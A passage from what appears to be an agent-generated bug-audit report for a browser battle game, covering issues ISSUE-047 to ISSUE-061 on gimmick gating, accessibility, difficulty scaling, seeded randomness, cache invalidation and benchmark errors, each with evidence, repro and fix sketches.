**Blast radius**: None for gameplay — the engine flags these via `_isBuildAbilityIllegal` and gates them behind end-game opt-in (`allowIllegal`/`forceIllegal` in `makeBuild` 10297). Relevant to the retune only as a caveat: any new "legal moveset/ability" validation for the curve must (a) resolve mega/form abilities against the form key, and (b) treat hackmons/AAA tiers as legitimately ability-free, or it will produce ~672 phantom findings.

**Fix sketch**: If the retune adds an ability-legality gate, reuse `_isBuildAbilityIllegal` (which already encodes the mega/hackmons rules) rather than a raw species.json abilities check.

**Verification**: Confirm a standard-tier (ou/uu) non-mega build with an off-species ability does not exist (it doesn't); confirm flagged builds only surface in end-game `allowIllegal` flows.

---

## <a id="ISSUE-047"></a> ISSUE-047: Cable Link gimmick gate contradicts CHANGELOG promise that Cable Link surfaces pre-unlock mechanics

---
id: ISSUE-047
severity: P2
category: inconsistency
anchor_symbol: _makePlayerLinkBuild
current_line_hint: ~42374
file: battle.html
agents: [story-mode-investigator]
fingerprint: 4b6cce4cb746
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Cable Link gimmick gate contradicts CHANGELOG promise that Cable Link surfaces pre-unlock mechanics

**Evidence**:
```js
// battle.html ~10764 comment in _withStoryPlayerGimmickGate
// > Used by every player-side acquisition path EXCEPT Cable Link
// > (the premium "another trainer's mon" path is allowed to surface
// > pre-unlock gimmicks by design — see _makePlayerLinkBuild).

// CHANGELOG.md 2026-05-21 entry, lines 23-27:
// > Cable Link is deliberately left ungated — its premium "another
// > trainer's mon" vibe (high reroll cost, can surface pre-unlock
// > gimmicks) is the only sanctioned shortcut.

// battle.html ~42374 — actual implementation
function _makePlayerLinkBuild(name, tierTag) {
    try {
        window._pbsStoryUsePlayerGimmickGate = true;
        window._pbsStoryUnlockedGimmicks = sm.unlockedGimmicks || [];
        newBuild = makeBuild(name);
    } finally { ... }
}
```
The Cable Link builder applies the EXACT same gate that the CHANGELOG and the helper comment claim it bypasses. So a Gym-3 player paying for a Cable Link upgrade cannot, in practice, surface a Mega/Z/Tera/DMax build.

**Repro**: At Gym 3 (badges=3, `sm.unlockedGimmicks` empty), Cable Link upgrade a Charizard. The result will never carry a Charizardite Y, no matter how many rerolls.

**Blast radius**: Two parts: (1) the comment + CHANGELOG entries above are stale/lying about the gate; (2) if the *spec* intent was the documented "Cable Link is the premium pre-unlock shortcut" behaviour, the implementation regressed. `STORY_MODE_FLOW.md §15d` line 712-715 actually says Cable Link **IS** gated ("preserves the existing player gimmick gating … Cable Link only rolls gimmicks the player has unlocked"), so the spec is internally consistent with the code, but the CHANGELOG and `_withStoryPlayerGimmickGate` comment contradict it.

**Fix sketch**: Either (a) drop the gate from `_makePlayerLinkBuild` to match the CHANGELOG, or (b) rewrite the CHANGELOG entry and the `_withStoryPlayerGimmickGate` comment to match reality and the existing spec.

**Verification**: After (a), Cable Link rerolls / upgrades / rebuilds at pre-Gym-5 should occasionally roll Mega/Z/Tera/DMax mons; the `if (!Array.isArray(window._pbsStoryUnlockedGimmicks))` short-circuit in `_mechForGimmickRoll` (line 10751) handles "no gate" cleanly.

---

## <a id="ISSUE-048"></a> ISSUE-048: Story autosave "💾 Saved" toast bypasses the polite live region — screen readers miss it

---
id: ISSUE-048
severity: P2
category: a11y
anchor_symbol: _maybeShowSaveToast
current_line_hint: ~30847
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: b17b3f418817
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Story autosave "💾 Saved" toast bypasses the polite live region — screen readers miss it

**Evidence**:
```js
// _maybeShowSaveToast at ~30847
const el = document.createElement('div');
el.className = 'story-save-toast';
el.textContent = '💾 Saved';
el.style.cssText = 'position:fixed;left:50%;bottom:18px;…';
document.body.appendChild(el);   // ← appends to <body>, NOT #toast-host
```

The toast helper that the rest of the game uses (`window.showToast`, ~8722) appends into `#toast-host` (line 7389) which has `aria-live="polite"`. `_maybeShowSaveToast` constructs its own DOM and appends straight to `document.body`, so the toast is never inside a live region and never announced. The visual styling also bakes in `pointer-events:none` so SR users can't even pull focus to it.

**Repro**: Run a story battle to completion with a screen reader on; the visual "💾 Saved" toast renders, but VoiceOver/NVDA stays silent.

**Blast radius**: Save events are the only confirmation a player gets that their progress persisted (the localStorage write is fire-and-forget). Blind story-mode players have no audible confirmation of autosave. Affects every transition: battle end, enterCity, renderActions, etc.

**Fix sketch**: Append the toast element into `document.getElementById('toast-host')` instead of `document.body`, or add `role="status" aria-live="polite"` directly on the element before appending. Keep the throttle + `pointer-events:none`.

**Verification**: After fix, `grep -A2 _maybeShowSaveToast battle.html` shows the host insertion. Run with a screen reader → "Saved" is announced once per ≥3s window.

---

## <a id="ISSUE-049"></a> ISSUE-049: "PC nearly full" warning threshold is `PC_BOX_CAP - 3` (27/30) but the spec calls for 80% (8/10)

---
id: ISSUE-049
severity: P2
category: inconsistency
anchor_symbol: _pcRefresh
current_line_hint: ~38678
file: battle.html
agents: [story-mode-investigator]
fingerprint: f7ba532510f0
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: "PC nearly full" warning threshold is `PC_BOX_CAP - 3` (27/30) but the spec calls for 80% (8/10)

**Evidence**:
```js
// battle.html ~38677
const boxFull = box.length >= PC_BOX_CAP;
const lowSlotWarn = box.length >= (PC_BOX_CAP - 3) && box.length < PC_BOX_CAP;
// PC_BOX_CAP === 30, so warning fires at 27/30 (90%).

// STORY_MODE_FLOW.md §7:
// > At ≥ 8/10 the screen shows a "PC nearly full" warning banner;
// > at 10/10 a new wild catch fails outright with a clear modal
```
80% of 10 = 8. The spec's ratio (8/10 = 80%) differs from the code's ratio (27/30 = 90%). Bound to the P1 PC_BOX_CAP discrepancy — if cap is realigned to 10, the warning at "cap-3" becomes 7/10, even further off-spec.

**Repro**: Deposit 26 mons in PC. No warning. Deposit 27th — warning fires. Per spec, the warning should have fired at 8.

**Blast radius**: Cosmetic warning UX. Becomes a real issue if the P1 PC_BOX_CAP discrepancy is resolved either direction.

**Fix sketch**: Replace `(PC_BOX_CAP - 3)` with `Math.floor(PC_BOX_CAP * 0.8)` so the warning ratio is parametric. At cap=10 → fires at 8; at cap=30 → fires at 24.

**Verification**: After fix, warning fires at 80% of whatever cap was. Spec text matches code at any cap.

---

## <a id="ISSUE-050"></a> ISSUE-050: Rivalry tab is mis-homed in the Pokémon Center — belongs in a progression/journal surface

---
id: ISSUE-050
severity: P2
category: refactor
anchor_symbol: _pcRenderRivalJournalTab
current_line_hint: ~42866
file: battle.html
agents: [story-mode-investigator]
fingerprint: f642d84a30e0
confidence: medium
status: open
---

**Title**: Rivalry tab is mis-homed in the Pokémon Center — belongs in a progression/journal surface

**Evidence**:
```html
<!-- battle.html:8501 — 3rd tab of #screen-story-pokemoncenter -->
<button id="story-pc-tab-journal-btn" onclick="window.StoryMode.pcSwitchTab('journal')"
  title="Your rivalry — past encounters, their teams, win/loss record"> Rivalry</button>
```

**Repro**: `_pcRenderRivalJournalTab` (battle.html:42866) renders a read-only journal of `sm.rivalEncounterLog` — W/L standing, the rival's team per encounter (sprite chips), badge stage, and champion-claim status. It sits as the 3rd tab inside the Pokémon Center, whose other two tabs (PC Storage, Underground) are both mon-inventory management. The Rivalry journal is narrative/progression telemetry — orthogonal to mon storage/selling.

**Blast radius**: Discoverability — a player managing their box has no reason to expect rivalry history there; a player wanting to check the rivalry won't think "Pokémon Center". The maintainer's "a bit irrelevant" instinct is correct.

**Fix sketch**: RECOMMENDATION: move it. It is fully self-contained (reads only `sm.rivalEncounterLog` + `_rivalDisplayName`/`rivalPhaseTagline`), so relocation is low-risk. Best home is the cross-run Collection surface (alongside Pokédex / Achievements / Hall of Fame — `openCollection`) as a per-run "Rivalry" panel, OR a city-hub action gated on `sm.rivalEncounterLog.length >= 1` (mirrors the existing rival-cameo gate at 38598). Do NOT cut it — the data capture in `setRivalStanding` (32001–32016) is already wired and the journal is good fanservice. Just re-parent the render call and drop the PC tab button.

**Verification**: Confirm the journal renders identically under the new parent; confirm `pcSwitchTab` no longer references 'journal'.

---

## <a id="ISSUE-051"></a> ISSUE-051: Battle Frontier hub displays stale, weaker foe-scaling numbers than what applyStoryLeagueFoeStatBoost actually applies

---
id: ISSUE-051
severity: P2
category: inconsistency
anchor_symbol: _renderFrontierHub
current_line_hint: ~43747
file: battle.html
agents: [story-mode-investigator]
fingerprint: eb2165a89001
confidence: high
status: open
---

**Title**: Battle Frontier hub displays stale, weaker foe-scaling numbers than what applyStoryLeagueFoeStatBoost actually applies

**Evidence**:
```js
// _renderFrontierHub (display):
const hpMult = Math.min(2.50, 1.35 + (round - 1) * 0.05);     // caps 2.50
const bulkMult = Math.min(1.80, 1.20 + (round - 1) * 0.03);   // caps 1.80
// applyStoryLeagueFoeStatBoost (actually applied, "accelerated ramp"):
const hpM   = Math.min(3.00, 1.50 + (round - 1) * 0.075);     // caps 3.00
const bulkM = Math.min(2.00, 1.25 + (round - 1) * 0.045);     // caps 2.00
```

**Repro**: Open the Battle Frontier hub. It prints "Round N foe stats: HP ×X, bulk/speed ×Y" using the OLD formula, and the intro tip says "+35% HP edge at the start". But `applyStoryLeagueFoeStatBoost` (the function startBattle actually runs on Frontier foes) uses the post-overhaul sharper curve. Computed deltas: round 1 displays HP ×1.35 / actual ×1.50; round 10 displays ×1.80 / actual ×2.18; round 21 displays ×2.35 / actual ×3.00. Bulk/speed likewise understated, and the display omits that speed scales too.

**Blast radius**: Player-facing difficulty information for the entire Frontier ladder. Players plan team investment off numbers that understate the real wall — every round is meaningfully harder than advertised. The "accelerated ramp" overhaul updated the apply-side but left two display sites (the per-round line ~43759 and the intro tip ~43738) on the pre-overhaul formula.

**Fix sketch**: Single-source the multipliers: have `_renderFrontierHub` read the same constants/formula as `applyStoryLeagueFoeStatBoost` (factor it into a shared `_frontierFoeMult(round)` helper) and update the intro-tip copy to "+50% HP edge at the start ... caps at +200% HP".

**Verification**: Hub round-N display equals the actual maxHp/stat multiplier applied to a Frontier foe at round N (compare displayed string vs `mon.maxHp` ratio post-boost).

---

## <a id="ISSUE-052"></a> ISSUE-052: Story tutorial overlay (STORY_TUTORIAL_SCENES) is not a dialog — no role, focus trap, or ESC

---
id: ISSUE-052
severity: P2
category: a11y
anchor_symbol: _showStoryTutorialScene
current_line_hint: ~34943
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 3bc8f10d137b
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Story tutorial overlay (STORY_TUTORIAL_SCENES) is not a dialog — no role, focus trap, or ESC

**Evidence**:
```js
// _showStoryTutorialScene at ~34943
const ov = document.createElement('div');
ov.className = 'story-tutorial-overlay';   // no role, no aria-modal
…
ov.querySelector('button').onclick = function (e) { e.stopPropagation(); dismiss(); };
ov.onclick = function (e) { if (e.target === ov) dismiss(); };
document.body.appendChild(ov);             // no autofocus on Continue
```

The full-screen tutorial overlay (Prof. Oak intros for first-trainer-battle, first-wild, first-mart, etc. in `STORY_TUTORIAL_SCENES`) is a `<div>` with no `role="dialog"`, no `aria-modal="true"`, no `aria-labelledby` pointing at the nameplate, no focus management (focus stays on whatever button triggered the overlay), and no `Escape` key handler. Click-outside dismiss + auto-focus + ESC are the standard expectations for a story-blocking modal.

**Repro**: Trigger `playStoryTutorial('firstWild', …)` (first wild encounter). Open with keyboard — Tab does not enter the dialog; Esc does nothing; SR sees a context-less paragraph dropped into the page.

**Blast radius**: All 10+ first-time-mechanic scenes (firstTrainerBattle, firstWild, firstSafariCatch, firstMart, firstDept, firstSafari, firstCasino, firstPokemonCenter, …). These are the first impression for new players, so the keyboard/SR experience here is load-bearing for onboarding.

**Fix sketch**: Set `ov.setAttribute('role','dialog')` and `aria-modal="true"`; give the nameplate `id="story-tutorial-name-<uid>"` and `aria-labelledby` the overlay; `requestAnimationFrame(() => ov.querySelector('button').focus())`; add a keydown listener for `Escape`/`Enter` that calls `dismiss()`. Remove the listener on dismiss.

**Verification**: Tab into the overlay; SR announces "Your First Fight, dialog". Esc closes. Focus returns to the previously-focused element.

---

## <a id="ISSUE-053"></a> ISSUE-053: Current enemy curve is lumpy, not rising — GL4=GL5 dead zone (foe mult 1.0) and a GL8 quad-cliff (T3->T4 + IV 18->26 + gimmicks 2->3)

---
id: ISSUE-053
severity: P2
category: inconsistency
anchor_symbol: _stageGatedFoeStatMult
current_line_hint: ~13953
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 2f6b5645d86f
confidence: high
status: open
---

**Title**: Current enemy curve is lumpy, not rising — GL4=GL5 dead zone (foe mult 1.0) and a GL8 quad-cliff (T3->T4 + IV 18->26 + gimmicks 2->3)

**Evidence**:
```js
// _stageGatedFoeStatMult (13967): Gym n<6 -> 1.0, n>=6 -> 1.05, n>=8 -> 1.10.
const n = +gl[1]; if (n >= 8) return 1.10; if (n >= 6) return 1.05; return 1.0;
// _storyBuildTierForEvent (33550): GL n<3 T1, n 3-7 -> T2/T3, n>=8 -> TOURNAMENT(T4).
// STORY_IV_TIER_RANGES (30060): T2 {10,22}, T3 {18,28}, T4 {26,31}.
```

**Repro**: Cross-read of the three scaling functions vs docs/story-design/story-power-curve.csv. GL4 and GL5 are identical on every axis (T2, IV 10-22, mult 1.0) precisely when the player unlocks the EV Trainer/Dojo/Safari at C4 — a 2-city power inversion (player spikes, enemy flat). GL8 stacks five escalators in one fight (EV tier, IV floor, gimmick count, sub-trainer grade, legendary gate). Net trajectory today: VERY EASY (GL1-2) -> EASY (GL3) -> dips back toward VERY EASY (GL4-5) -> MEDIUM (GL6-7) -> HARD-spike (GL8) -> HARD (E4). This is assessed against the *current* engine state (not the planned retune).

**Blast radius**: Player-perceived difficulty trajectory across the whole story. The flat/dip-then-cliff shape is the opposite of the desired smooth very-easy->very-hard climb. (The REDESIGN_PLAN already proposes a retune; this finding documents the current shortfall, not the unimplemented plan.)

**Fix sketch**: As the plan's §8a notes — don't let the GL4-5 foe mult collapse to 1.0 (ramp ~1.0->1.03 + small GL5 IV bump), and spread the GL8 jump across GL6-7-8 (IV floor 18->22->26, GL7 partial-T4). Encoded in story-tunables.csv.

**Verification**: Recompute per-GL effective foe BST*mult and IV floor after tuning; assert monotonic non-decreasing across GL1..GL8 with no single-step jump > the chosen ceiling.

---

## <a id="ISSUE-054"></a> ISSUE-054: Foe party size matches `team.length` with per-role floors instead of the spec'd `min(6, 2+badges)` badge curve

---
id: ISSUE-054
severity: P2
category: balance
anchor_symbol: _storyEnemyPartySize
current_line_hint: ~37311
file: battle.html
agents: [story-mode-investigator]
fingerprint: aa41935a60b3
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Foe party size matches `team.length` with per-role floors instead of the spec'd `min(6, 2+badges)` badge curve

**Evidence**:
```js
// battle.html ~37311  (implementation)
function _storyEnemyPartySize(event, playerTeamLen, eventId) {
    if (... Champion / Victory Road / E1-4 / Mystery Figure) return 6;
    if (eventId === STORY_RIVAL_ROW_INTRO) return min(6, max(1, playerTeamLen)); // pure player-match
    let floor = 1;
    if (/Rival/i.test(e)) floor = 2;
    else { /* gym leader 1..2:2, 3..4:3, 5..6:4, 7:5, 8:6 */ }
    return Math.max(floor, min(6, playerTeamLen));   // ← team length + role floor
}

// STORY_MODE_FLOW.md §1 (canonical spec):
//   "Foe sizing | Badge curve: min(6, 2 + badges) for everyone except story
//    finales (always 6) and the intro rival (pure player-match for a 1v1
//    starter duel). So foes = 2 pre-Gym-1, 3 post-Gym-1, …, 6 from
//    post-Gym-4 on."
// STORY_MODE_FLOW.md §1, "Expected sequence" row:
//   "GL2 3v3 → (badge 2, cap 4)"  — but if a player at 1 badge with only
//    2 mons faces GL2, the code returns max(2, min(6, 2)) = 2, not 3.

// Confirming the spec read: the balance audit helper at battle.html:48055
// computes the spec-correct curve as the reference:
const partySize = Math.min(6, 2 + badgesAccum);
```

**Repro**: Start a run, decline every Professor (only the starter), don't catch any wild. Reach GL2 at 1 badge with team.length=1. Foe size = `max(2, min(6, 1)) = 2`, not the spec'd `min(6, 2+1) = 3`.

**Blast radius**: Affects every non-finale foe count for a "non-catcher" player who keeps their party lean. Most-impacted: GL1-GL4 (Stage 1/2) where players regularly skip catches. Sub-leader trainers (Basic Trainer / Gym Trainer / Elite Trainer have role-floor=1) skip the spec curve hardest — at 4 badges + 1 mon they're still 1v1, but spec says 5v5.

**Fix sketch**: Change `_storyEnemyPartySize` to ignore `playerTeamLen` for non-finale, non-intro-rival rows and return the badge curve directly:
```js
function _storyEnemyPartySize(event, _playerTeamLen, eventId) {
    if (... finale list) return 6;
    if (eventId === STORY_RIVAL_ROW_INTRO) return Math.max(1, Math.min(6, _playerTeamLen | 0));
    return Math.min(6, 2 + ((sm && sm.badges) | 0));
}
```
This matches the audit helper at line 48055 exactly. Or update `STORY_MODE_FLOW.md` to ratify the team-length match if that was the intentional balance change.

**Verification**: A no-catcher run at 1 badge facing GL2 should now field 3 foes. The "Expected sequence" table in `STORY_MODE_FLOW.md §1` should match observed behaviour.

---

## <a id="ISSUE-055"></a> ISSUE-055: rollTrainerTeam's evo-stage cap uses cityIndexFromEventIndex on a ROW ID (not array index) — intro Rival gets cap 2 (fully evolved) instead of 0 (basics-only)

---
id: ISSUE-055
severity: P2
category: bug
anchor_symbol: _storyEvoStageCapForRow
current_line_hint: ~33074
file: battle.html
agents: [story-mode-investigator]
fingerprint: 62b71f668975
confidence: high
status: open
---

**Title**: rollTrainerTeam's evo-stage cap uses cityIndexFromEventIndex on a ROW ID (not array index) — intro Rival gets cap 2 (fully evolved) instead of 0 (basics-only)

**Evidence**:
```js
function _storyEvoStageCapForRow(rowIdx) {
    if (rowIdx == null || !(sm && sm.active)) return 2;
    return _storyEvoStageCapForCity(cityIndexFromEventIndex(rowIdx)); // cityIndexFromEventIndex expects an ARRAY INDEX
}
// caller: rollTrainerTeam(..., event, idx) where idx = ev[0] = ROW ID (~line 42422)
// const _evoStageCap = _storyEvoStageCapForRow(storyRowIdx);  // storyRowIdx is a row ID
```

**Repro**: STORY_EVENTS_RAW row IDs are NOT array indices (intro Rival is array index 1 but row ID 68). `cityIndexFromEventIndex(ei)` walks `STORY_EVENTS_RAW[ei]` treating `ei` as an array index. `rollTrainerTeam` is called with `storyRowIdx = ev[0]` (row ID) and passes it through `_storyEvoStageCapForRow` → `cityIndexFromEventIndex(68)`, which (68 is past the 0–66 array) walks down to the last City row = City 9 → evo cap 2 (no restriction). The intro Rival therefore can field FULLY-EVOLVED Pokémon; the design intends City-0 basics-only (cap 0). Verified: `cityIndexFromEventIndex(68)=9, evoCap=2` vs correct `cityIndexFromEventIndex(1)=0, evoCap=0`. Three other rows also diverge (Basic Trainer idx14/id15, Rival idx19/id12, Elite Trainer idx57/id58). NOTE the SAME `storyRowIdx` is correctly a row ID for the sibling call `applyStoryProgressToGradeWeights` (which compares against row-ID constants STORY_GRADE_BIAS_ROW_*), so the fix belongs in `_storyEvoStageCapForRow`, not the caller.

**Blast radius**: Evo-stage cap for every trainer whose row ID ≠ array index — most visibly the intro Rival (the player's first fight) showing evolved forms it shouldn't. Mitigated for the intro Rival by its g4:100 gradeWeights (weak-BST pool), but the stage cap is still violated and the early-Rival case is exactly the one the code comment claims to protect ("only bites the early Rival").

**Fix sketch**: `_storyEvoStageCapForRow` should convert the row ID to an array index before calling `cityIndexFromEventIndex` — e.g. `const ai = STORY_EVENTS_RAW.findIndex(r => r && (r[0]|0) === (rowIdx|0)); return _storyEvoStageCapForCity(cityIndexFromEventIndex(ai));` — or accept an array index and have `rollTrainerTeam` pass the array index for the cap while keeping the row ID for the grade-bias call.

**Verification**: `rollTrainerTeam` for the intro Rival (row 68) yields only Stage-0 (unevolved) species; assert `_storyEvoStageCapForRow(68) === 0` after the fix.

---

## <a id="ISSUE-056"></a> ISSUE-056: Planned hatch animation + Fight Club transitions need reduced-motion + live-region design up front

---
id: ISSUE-056
severity: P2
category: a11y
anchor_symbol: _storyHatchRevealScene
current_line_hint: ~39815
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: bbbcf8f348ca
confidence: medium
status: open
---

**Title**: Planned hatch animation + Fight Club transitions need reduced-motion + live-region design up front

**Evidence**:
```js
function _storyHatchRevealScene(names) {
    // current reveal is TEXT-ONLY (_storyScene), SR-safe today
    _storyScene([{ accent:'#ffd54f', title:'Your Egg Hatched!', html:`The egg shudders, cracks...` }], ...);
}
```

**Repro**: Forward-looking. REDESIGN_PLAN §3b/§8b replaces this text reveal with an egg wiggle→crack→sprite-pop *animation* and adds Fight Club draft transitions, with no a11y constraints noted. Today's text reveal is accessible; the animation risks regressing it.

**Blast radius**: New daycare hatch scene + Fight Club draft/gauntlet screens. The existing global reduced-motion catch-all (L6660: `*{animation-duration:1ms}`) covers CSS keyframes, but a JS-driven sprite-pop sequence (cf. L9185 which already checks `prefers-reduced-motion`) must opt in explicitly.

**Fix sketch**: (a) Hatch animation: gate on `matchMedia('(prefers-reduced-motion: reduce)')` and fall back to the current text reveal (keep it, don't delete it); ensure the hatched-species name is announced via `role="status"`. (b) Draft picker: build as real buttons (see renderDraft finding) with focus moved to the grid on entry. (c) Gauntlet: announce each round result through a polite live region.

**Verification**: With reduced-motion on, hatch shows the still text reveal; draft is fully keyboard-operable; round wins/losses are announced.

---

## <a id="ISSUE-057"></a> ISSUE-057: `_storyPickMysteryIdentity` uses bare `Math.random()` — Mystery Figure roll diverges across seeded replays

---
id: ISSUE-057
severity: P2
category: bug
anchor_symbol: _storyPickMysteryIdentity
current_line_hint: ~28753
file: battle.html
agents: [story-mode-investigator]
fingerprint: 9e0788d6bed7
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `_storyPickMysteryIdentity` uses bare `Math.random()` — Mystery Figure roll diverges across seeded replays

**Evidence**:
```js
// battle.html ~28753
function _storyPickMysteryIdentity() {
    const allKeys = Object.keys(MYSTERY_FIGURE_IDENTITIES);
    ...
    let r = Math.random() * total;   // ← bare Math.random in biased branch
    ...
    return allKeys[Math.floor(Math.random() * allKeys.length)];  // ← bare in fallback
}
```

The mystery identity is pinned to `sm.mysteryIdentity` after first roll — so a single run is consistent. But two players sharing the same `?seed=X` (or one player retrying via deleteSave + same seed) get different Mystery Figure identities, breaking seeded-replay parity.

**Repro**: `localStorage.removeItem('pbs_story_save')`, then start two runs with the same seed via dev tools (force `sm.runSeed = 12345`). The two runs will diverge on `sm.mysteryIdentity` ≥ 80% of the time (8 keys, near-uniform).

**Blast radius**: Daily-seed contests, replay-share videos, the prior audit's "1.1 rival's secondary intro line uses bare Math.random" finding class. Identity choice affects sprite, intros, and outros across many scenes, so the divergence is highly visible.

**Fix sketch**: Replace both `Math.random()` calls with `(sm && sm.active) ? storyRngNext() : Math.random()` — same idiom as the wild-build / rival picks. Identity-bias preset path also.

**Verification**: After fix, two fresh runs with the same seed pick the same `sm.mysteryIdentity`. Existing saves migrate trivially — `sm.mysteryIdentity` is already pinned, so they keep whatever they rolled.

---

## <a id="ISSUE-058"></a> ISSUE-058: CSV-load cache invalidation pokes IIFE-private `_txMetaCache`/`_txGlobalMetaCached` — invalidation is dead

---
id: ISSUE-058
severity: P2
category: inconsistency
anchor_symbol: _txMetaCache
current_line_hint: ~9897
file: battle.html
agents: [consistency-auditor]
fingerprint: 092d23ae6973
confidence: high
status: open
---

**Title**: CSV-load cache invalidation pokes IIFE-private `_txMetaCache`/`_txGlobalMetaCached` — invalidation is dead

**Evidence**:
```js
// lines 9897-9898 and 9949-9950 (after builds.csv / API load, script-top scope)
try { if (typeof _txMetaCache !== 'undefined') _txMetaCache.clear(); } catch (e) {}
try { _txGlobalMetaCached = null; } catch (e) {}
```

**Repro**: `_txMetaCache` (47641) and `_txGlobalMetaCached` (47642) are declared inside the StoryMode IIFE with no `window.` export. `typeof _txMetaCache` is always `'undefined'` so `.clear()` never runs; the bare assignment to `_txGlobalMetaCached` throws ReferenceError that the bare `try/catch` silently swallows.

**Blast radius**: The tutor / dojo / nature-rater meta caches are never invalidated when builds.csv finishes loading, so any screen rendered before the CSV resolved keeps serving stale/empty popularity stats for the session. Same scope-leak class; the assignment site is the dangerous (throwing) variant, masked by an empty catch.

**Fix sketch**: Either expose an invalidator (e.g. `window.StoryMode.invalidateMetaCaches()`) called from the CSV loader, or move the cache invalidation logic inside the IIFE.

**Verification**: After lazy CSV load, confirm a tutor screen reflects the freshly-loaded sets rather than the pre-load baseline.

---

## <a id="ISSUE-059"></a> ISSUE-059: applyStatus dereferences `state.pActive.volatile.lockMove` / `state.fActive.volatile.lockMove` unconditionally (Uproar check) — throws if an active is null

---
id: ISSUE-059
severity: P2
category: bug
anchor_symbol: applyStatus
current_line_hint: ~26773
file: battle.html
agents: [battle-engine-debugger]
fingerprint: b90b810adcdc
confidence: medium
status: open
---

**Title**: applyStatus dereferences `state.pActive.volatile.lockMove` / `state.fActive.volatile.lockMove` unconditionally (Uproar check) — throws if an active is null

**Evidence**:
```js
// Uproar prevents sleep for all mons on the field
if (status === "SLP" && (state.pActive.volatile.lockMove === "Uproar" || state.fActive.volatile.lockMove === "Uproar")) {
    logMsg(`Uproar prevents sleep!`, 'info'); return;
}
```

**Repro**: Reasoning — most preceding guards in applyStatus key off `mon`, but this single line reaches into BOTH actives. If `applyStatus` is ever invoked (e.g. Synchronize mirror at 26799, or a delayed status from a field effect) while one side's active is momentarily null (post-faint, pre-replacement), `state.fActive.volatile.lockMove` throws. Caught only by the playTurn turn-skip handler.

**Blast radius**: Any status application (sleep/para/poison/burn) routed through this function. Lower likelihood than the other two (actives are usually both present during a move), hence P2.

**Fix sketch**: `const pUp = state.pActive && state.pActive.volatile && state.pActive.volatile.lockMove === "Uproar"; const fUp = ...; if (status === "SLP" && (pUp || fUp)) {...}`.

**Verification**: Call applyStatus(mon,"SLP") with `state.fActive = null`; assert it does not throw.

---

## <a id="ISSUE-060"></a> ISSUE-060: Memory growth is benign (linear, ~25 KB/turn, R² = 0.712 — noise-dominated) and **does not indicate a leak**; the mandate's "60 turn / quadratic = P1" threshold is not hit

---
id: ISSUE-060
severity: P2
category: perf
anchor_symbol: benchMemoryGrowth
current_line_hint: 65
file: scripts/debug/perf-bench.mjs
agents: [performance-profiler]
fingerprint: a20dbf90774a
confidence: high
status: wontfix-not-a-bug-noise-dominated-growth-as-flagged-by-agent
---

**Title**: Memory growth is benign (linear, ~25 KB/turn, R² = 0.712 — noise-dominated) and **does not indicate a leak**; the mandate's "60 turn / quadratic = P1" threshold is not hit

**Evidence**: `scripts/debug/_repro/mem-growth.mjs` run with `--expose-gc`, 200 turns, sampling every 10:
```
heap @ turn  0  = 82.5 MB
heap @ turn 100 = 84.4 MB
heap @ turn 190 = 85.5 MB

Linear fit: heap = 0.0159 * turn + 82.50   R² = 0.712
Heap delta over 200 turns: 5.0 MB
Avg per-turn heap growth: 25.52 KB
```
Slope is essentially flat; R² = 0.712 indicates the linear trend explains only ~70% of variance — the rest is GC noise. Across 200 turns the heap moves 3 MB net, which is well within normal GC fluctuation for a 80+ MB resident set. **No leak.**

This finding documents the result so future runs have a baseline. Logged as P2 with `confidence: high` because the mandate explicitly asked us to check for quadratic growth across the 60-turn benchmark — the answer is "linear, slope ~0, not a leak", and that null result is worth recording.

**Repro**: `node --expose-gc scripts/debug/_repro/mem-growth.mjs`. Without `--expose-gc` the variance is higher (5–10 MB swings between samples) because GC is unpredictable; with it the trend stabilizes.

**Blast radius**: None. This is a "ruled out" finding, not a defect. If a future change introduces a quadratic-growth bug, this baseline will catch it: 25 KB/turn is the floor; anything > 250 KB/turn (10×) for ≥ 100 turns should be re-classified as P1.

**Fix sketch**: No fix needed. Consider adding a `--expose-gc` recommendation to the `perf-bench.mjs` output (it's already there at line 157) and treating > 250 KB/turn average growth as a regression threshold in CI.

**Verification**: Re-run `node --expose-gc scripts/debug/_repro/mem-growth.mjs` after any change to the turn loop; confirm slope remains < 0.05 MB/turn.

---

## <a id="ISSUE-061"></a> ISSUE-061: `perf-bench.mjs` calls `parseMoveEffects(move)` with the wrong arg-count; the reported 1.4 ms "median" is the cost of a thrown `TypeError`, not real per-move parsing

---
id: ISSUE-061
severity: P2
category: perf
anchor_symbol: benchParseMove
current_line_hint: 58
file: scripts/debug/perf-bench.mjs
agents: [performance-profiler]
fingerprint: c57a28528982
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `perf-bench.mjs` calls `parseMoveEffects(move)` with the wrong arg-count; the reported 1.4 ms "median" is the cost of a thrown `TypeError`, not real per-move parsing

**Evidence**:
```js
// scripts/debug/perf-bench.mjs:58
try { engine.parseMoveEffects(move); } catch (e) { /* malformed entry skipped */ }
```
The real signature is `parseMoveEffects(attacker, defender, move, isPlayer, _bouncedDepth)` (battle.html:24269). Calling with a single arg means `attacker = moveObject`, and the first line `let eff = (move.effectStr || move.eff || "").toLowerCase();` reads `move.effectStr` against `move = undefined` (the original move parameter), throwing `TypeError: Cannot read properties of undefined (reading 'effectStr')`. The harness then crashes after the bench loop is over because the final `catch` doesn't suppress the un-awaited Promise rejection from `parseMoveEffects` being `async`.

**Repro**: `node scripts/debug/perf-bench.mjs` produces `tests/reports/perf.md` with `Median: 1.438 ms 🚨 >2× over target`, then the process crashes with the TypeError above. The 1.438 ms number is the cost of *entering an async function, throwing, and creating a rejected Promise* — not the cost of actually parsing a move.

**Blast radius**: Misleading P2-style red flag in every CI / agent run. A drill-down (see `scripts/debug/_repro/parse-move-drill.mjs`) that calls `parseMoveEffects(attacker, defender, move, true)` correctly across all 950 moves with a valid attacker (Pikachu) and defender (Snorlax) measures a **median of 0.013 ms per call** — about 38× under the 0.5 ms target. parseMoveEffects is not actually slow.

